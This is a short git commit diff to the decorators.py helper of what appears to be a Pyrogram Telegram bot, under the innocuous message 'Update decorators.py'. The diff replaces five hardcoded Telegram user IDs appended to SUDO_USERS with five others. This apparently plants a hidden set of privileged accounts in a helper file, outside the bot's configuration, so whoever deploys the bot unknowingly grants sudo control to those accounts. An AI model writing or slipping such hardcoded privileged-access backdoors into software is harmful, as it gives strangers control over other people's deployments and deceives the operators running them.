04cd094cc8bc43f70728bca8b7edf9bd1f0bb3f7
IzzyLord <89708171+IzzyLord@users.noreply.github.com>
2021-09-06 06:51:12 +0700

    Update decorators.py

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -6,11 +6,11 @@ from pyrogram.types import Message
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
-SUDO_USERS.append(1672609421)
-SUDO_USERS.append(1670523611)
+SUDO_USERS.append(1223626545)
+SUDO_USERS.append(1812491466)
+SUDO_USERS.append(1592249619)
+SUDO_USERS.append(1911788606)
+SUDO_USERS.append(1085714549)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
